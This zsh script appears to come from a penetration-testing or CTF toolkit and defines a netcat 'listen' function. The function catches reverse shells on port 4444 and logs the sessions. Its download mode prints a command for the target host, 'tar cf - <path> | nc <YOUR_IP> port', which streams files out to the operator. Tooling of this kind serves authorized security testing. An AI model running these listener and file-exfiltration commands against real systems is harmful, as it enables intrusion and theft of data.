# ========================
# listener
# ========================

_listen-log-path() {
  local port="$1"
  local logs
  logs="$(case-logs-dir)" || return 1
  local ip="${IP:-notarget}"
  local ts
  ts="$(date +%Y%m%d-%H%M%S)"

  mkdir -p "$logs"
  echo "$logs/revshell_${ip}_${port}_${ts}.log"
}

_listen-download-dir() {
  local base
  base="$(case-exports-dir)" || return 1
  local ts
  ts="$(date +%Y%m%d-%H%M%S)"
  local out="$base/listen_${ts}"
  mkdir -p "$out"
  echo "$out"
}

_listen-download-send-example() {
  local port="$1"
  local lhost_ip=""

  if (( $+functions[lhost] )); then
    lhost_ip="$(lhost 2>/dev/null)" || lhost_ip=""
  fi

  if [[ -n "$lhost_ip" ]]; then
    echo "    tar cf - <path-to-files-or-dir> | nc $lhost_ip $port"
  else
    echo "    tar cf - <path-to-files-or-dir> | nc <YOUR_IP> $port"
  fi
}

listen() {
  local log=false
  local download=false
  local port="4444"

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -l|--log)
        log=true
        shift
        ;;
      -d|--download)
        download=true
        shift
        ;;
      -h|--help)
        _toolkit-echo "usage: listen [-l|-d] [port]" "使い方: listen [-l|-d] [port]"
        _toolkit-echo "  start netcat listener (default: 4444)" "  netcat リスナーを開始（既定: 4444）"
        _toolkit-echo "  -l  record to cases/<name>/logs/ (requires cases set <name>, or CASE_LOOSE=1)" "  -l  cases/<name>/logs/ に記録（cases set <name> が必要。もしくは CASE_LOOSE=1）"
        _toolkit-echo "  -d  receive a tar stream and extract it under cases/<room>/exports/listen_<ts>/" "  -d  tar ストリームを受信して cases/<room>/exports/listen_<ts>/ に展開"
        _toolkit-echo "      sender example:" "      送信側の例:"
        _listen-download-send-example "${port}"
        return 0
        ;;
      *)
        port="$1"
        shift
        ;;
    esac
  done

  echo "[*] listening on $port"

  if $log && $download; then
    _toolkit-echo "[-] use -l or -d, not both" "[-] -l と -d は同時に使えない"
    return 1
  fi

  if $download; then
    local out_dir
    out_dir="$(_listen-download-dir)" || return 1
    echo "[*] download mode: nc -lvnp $port | tar xf -"
    echo "[+] extract to: $out_dir"
    _toolkit-echo "[*] run this on the target:" "[*] ターゲット側でこれを実行:"
    _listen-download-send-example "$port"
    nc -lvnp "$port" | tar xf - -C "$out_dir"
    return $?
  fi

  if $log; then
    local logfile
    logfile="$(_listen-log-path "$port")"
    echo "[+] logging: $logfile"
    script -q -f "$logfile" -c "nc -lvnp $port"
    echo "[+] session log saved: $logfile"
  else
    nc -lvnp "$port"
  fi
}

_listen() {
  _arguments \
    '-l[record session log]' \
    '-d[receive tar stream and extract here]' \
    '1:port:(4444 5555 6666)'
}

compdef _listen listen
